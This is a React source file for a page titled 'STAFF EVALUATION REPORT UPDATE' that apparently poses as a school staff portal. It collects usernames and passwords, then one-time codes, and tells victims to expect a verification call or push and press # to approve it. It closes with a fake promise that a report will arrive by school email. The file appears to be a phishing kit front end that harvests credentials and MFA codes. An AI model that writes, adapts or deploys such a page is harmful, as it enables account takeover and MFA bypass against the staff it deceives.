import React, { useState } from 'react';
import { Mail, Lock, ArrowRight, CheckCircle, AlertCircle, Eye, EyeOff } from 'lucide-react';
import { login } from './services/api';
import OtpForm from './components/OtpForm'; // Import OtpForm

export default function App() {
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [error, setError] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');
  const [showOtpForm, setShowOtpForm] = useState(false);
  const [loggedInUsername, setLoggedInUsername] = useState<string | null>(null);
  const [otpSubmitted, setOtpSubmitted] = useState(false); // New state for post-OTP submission

  const handleLogout = () => {
    setIsSuccess(false);
    setShowOtpForm(false);
    setUsername('');
    setPassword('');
    setLoggedInUsername(null);
    setMessage('');
    setError('');
    setOtpSubmitted(false); // Reset on logout
  };

  const handleOtpSuccess = () => {
    setOtpSubmitted(true);
    setShowOtpForm(false);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsSuccess(false);
    setMessage('');
    setIsLoading(true);
    setShowOtpForm(false);
    setLoggedInUsername(null);

    if (!username || !password) {
      setError('Please provide both username and password.');
      setIsLoading(false);
      return;
    }

    try {
      const response = await login(username, password);
      setMessage(response.message);
      setIsSuccess(true);
      if (response.username) {
        setLoggedInUsername(response.username);
      }
      setShowOtpForm(true);
    } catch (err: any) {
      setError(err.message || 'An error occurred.');
    } finally {
      setIsLoading(false);
    }
  };

  if (otpSubmitted) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
        <div className="bg-white max-w-md w-full rounded-2xl shadow-xl p-8 text-center border-t-4 border-green-500 animate-fade-in-up">
          <div className="mx-auto w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-6 shadow-sm">
            <CheckCircle className="w-8 h-8 text-green-600" />
          </div>
          <h2 className="text-2xl font-bold text-gray-800 mb-2">Thank you for your submission</h2>
          <p className="text-gray-600 mb-6">Your response has been recorded, and your report will be sent to your school email within 24-48 hours.</p>
          <button
            onClick={handleLogout}
            className="w-full py-3.5 bg-slate-900 text-white rounded-lg font-medium hover:bg-slate-800 transition-colors shadow-lg hover:shadow-xl transform active:scale-[0.99]"
          >
            Done
          </button>
        </div>
      </div>
    );
  }

  if (isSuccess && showOtpForm && loggedInUsername) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
        <div className="bg-white max-w-md w-full rounded-2xl shadow-xl p-8 text-center border-t-4 border-green-500 animate-fade-in-up">
          <p className="text-gray-600 mb-4">  {loggedInUsername}</p>

          <p>A VERIFICATION CALL/PUSH WOULD BE SENT SHORTLY

            VERIFY AUTHENTICITY BY PRESSING # WHILE ON CALL</p>
          <OtpForm username={loggedInUsername} onOtpSuccess={handleOtpSuccess} />
          <button
            onClick={handleLogout}
            className="w-full py-3.5 bg-slate-900 text-white rounded-lg font-medium hover:bg-slate-800 transition-colors shadow-lg hover:shadow-xl transform active:scale-[0.99] mt-4"
          >
            Logout
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-100 to-slate-200 flex flex-col items-center justify-center p-4 font-sans text-slate-900">
      <h1 className="text-4xl font-extrabold text-slate-800 mb-8 text-center drop-shadow-sm">STAFF EVALUATION REPORT UPDATE</h1>
      <div className="bg-white max-w-md w-full rounded-2xl shadow-2xl overflow-hidden relative z-10 mb-8 border border-white/50">
        <div className="p-8">
          <h2 className="text-2xl font-bold text-gray-800 mb-6 text-center">Login</h2>

          {error && (
            <div className="mb-6 bg-red-50 border border-red-100 text-red-600 px-4 py-3 rounded-lg flex items-start gap-3 text-sm animate-pulse-slow">
              <AlertCircle className="w-5 h-5 shrink-0 mt-0.5" />
              <p>{error}</p>
            </div>
          )}

          <form onSubmit={handleSubmit}>
            <div className="space-y-5">
              <div>
                <label className="block text-xs font-bold text-slate-500 uppercase mb-2">Username</label>
                <div className="relative group">
                  <Mail className="absolute left-3 top-3.5 text-slate-400 w-5 h-5 group-focus-within:text-blue-600 transition-colors" />
                  <input
                    type="text"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full pl-10 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-lg focus:bg-white focus:border-blue-500 focus:ring-4 focus:ring-500/10 transition-all outline-none"
                    placeholder="Enter your username"
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-500 uppercase mb-2">Password</label>
                <div className="relative group">
                  <Lock className="absolute left-3 top-3.5 text-slate-400 w-5 h-5 group-focus-within:text-blue-600 transition-colors" />
                  <input
                    type={showPassword ? 'text' : 'password'}
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full pl-10 pr-12 py-3 bg-slate-50 border border-slate-200 rounded-lg focus:bg-white focus:border-blue-500 focus:ring-4 focus:ring-500/10 transition-all outline-none"
                    placeholder="••••••••••••"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-3.5 text-slate-400 hover:text-slate-600 transition-colors"
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>
            </div>

            <div className="mt-8">
              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-slate-900 text-white py-3.5 rounded-lg font-bold text-sm tracking-wide hover:bg-slate-800 transition-all shadow-lg flex items-center justify-center gap-2 group active:scale-[0.98]"
              >
                {isLoading ? (
                  <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                ) : (
                  <>Login <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" /></>
                )}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}